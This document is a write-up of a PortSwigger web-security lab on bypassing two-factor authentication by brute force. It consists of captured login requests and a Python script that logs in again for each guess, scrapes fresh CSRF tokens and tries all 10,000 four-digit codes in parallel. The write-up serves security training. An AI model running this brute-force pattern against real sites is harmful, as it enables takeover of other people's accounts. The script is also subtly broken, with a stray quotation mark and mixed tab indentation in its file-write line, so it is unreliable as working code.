# [Lab 9: 2FA bypass using a brute-force attack](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack)

## Description

This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.

Victim's credentials: `carlos:montoya`

---

## Solution

Navigate to the login page and intercept the login request with `carlos`'s credentials.

```http
POST /login HTTP/1.1
Host: ac501ff81fb5d65f80772a9a00f3003f.web-security-academy.net
Cookie: session=KNN8IMgojuPpigCLnBBYkbbCr7gs4opG
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: https://ac501ff81fb5d65f80772a9a00f3003f.web-security-academy.net
Dnt: 1
Referer: https://ac501ff81fb5d65f80772a9a00f3003f.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=BvqYgNlamBaPUhso5K0yFQec7BdkDhfZ&username=carlos&password=montoya
```

A `POST` request to `/login` with a cookie `session` and a body containing a CSRF token `csrf`, `username`, and `password`.

A successful response yields a 302 redirect to `/login2` with a new `session` cookie. This `session` cookie is required for the redirected request. The redirect yields the form to submit the 4-digit 2FA code, which also contains a CSRF token `csrf`.

Submit a random 2FA code to capture the submission request.

```http
POST /login2 HTTP/1.1
Host: ac501ff81fb5d65f80772a9a00f3003f.web-security-academy.net
Cookie: session=JBomLh8vcO2qpUwEWUZGhxGnLlvxfJxW
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: https://ac501ff81fb5d65f80772a9a00f3003f.web-security-academy.net
Dnt: 1
Referer: https://ac501ff81fb5d65f80772a9a00f3003f.web-security-academy.net/login2
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=uz1WxeSuraFP36mbB9B1RwR0EM8q1Uh0&mfa-code=1111
```

A `POST` request to `/login2` with the `session` cookie from the 302 redirect and a body containing another CSRF token `csrf` and the 4-digit 2FA code `mfa-code`.

The response from the server contains the string `Incorrect security code`.

![](images/Pasted%20image%2020210811153802.png)

Using BurpSuite Intruder, attempt a light brute force of `carlos`'s 2FA code to determine if there is any type of brute-force protection mechanism in play.

Whether the developers intended it to or not, it appears the CSRF token is acting as a form of brute force protection. After two requests, the CSRF token is invalidated by the server or expires and as a result, the 2FA code submission request is rejected.

![](images/Pasted%20image%2020210811154309.png)

To properly brute force the 2FA code, the request must contain a valid `session` cookie and CSRF token. A valid `session` cookie is granted in the 302 response to a successful username and password login and a valid CSRF tokens is picked up in the body of the 2FA code form. This means that for each 2FA code, a `POST` request must first be submitted to `/login` with `carlos`'s credentials, the `session` token must be extracted from the 302 response, the redirect should be followed, and the CSRF token `csrf` should be grapped from the 2FA login form, and `csrf` and `session` must be used in a `POST` request to `/login2` with the 2FA code.

The following script automates this process and writes an authenticated `session` cookie into a file named `$CODE.txt`. Use the `session` cookie to access `carlos`'s account at `/my-account`.

```python
from multiprocessing import Pool
import urllib3

from bs4 import BeautifulSoup 
import requests


# Disable self-signed cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def attempt_brute_force(code: str):

    # Fetch home page for CSRF
    with requests.get("https://ac501ff81fb5d65f80772a9a00f3003f.web-security-academy.net/login", verify=False) as response:
        assert response.status_code == 200 and "csrf" in response.text and "session" in response.cookies.get_dict(), "[!] Home page request for CSRF token and sessin cookie failed"
        soup = BeautifulSoup(response.content, "html.parser")
        csrf = soup.find("input", attrs={"name": "csrf"})['value']
        session_cookie = response.cookies['session']

    # Login as carlos and retrieve the session cookie and CSRF token
    response = requests.post(
        url="https://ac501ff81fb5d65f80772a9a00f3003f.web-security-academy.net/login",
        data={"username": "carlos", "password": "montoya", "csrf": csrf },
        cookies={"session": session_cookie},
        verify=False,
        allow_redirects=False
    )
    assert response.status_code == 302 and "session" in response.cookies.get_dict(), "[!] Error retrieving session cookie after login"
    session_cookie = response.cookies['session']

    response = requests.get(
        url="https://ac501ff81fb5d65f80772a9a00f3003f.web-security-academy.net/login2",
        cookies={"session": session_cookie},
        verify=False
    )
    assert response.status_code == 200 and "csrf" in response.text, "[!] Error retrieving CSRF token"
    soup = BeautifulSoup(response.content, "html.parser")
    csrf = soup.find("input", attrs={"name": "csrf"})['value']

    # Submit carlos's 2FA token
    response = requests.post(
        url="https://ac501ff81fb5d65f80772a9a00f3003f.web-security-academy.net/login2",
        data={"mfa-code": code, "csrf": csrf },
        cookies={"session": session_cookie},
        verify=False,
        proxies={"https": "http://127.0.0.1:8080"}
    )
    assert response.status_code == 200
    if "Incorrect security code" not in response.text:
        with open(f"{code}.txt", "a") as f:
			f.write(f"[*] Session cookie: {session_cookie}"")
    soup = BeautifulSoup(response.content, "html.parser")
    csrf = soup.find("input", attrs={"name": "csrf"})['value']


if __name__ == "__main__":
    with Pool(5) as p:
        p.map(attempt_brute_force, (str(i).zfill(4) for i in range(0, 10000)))
```
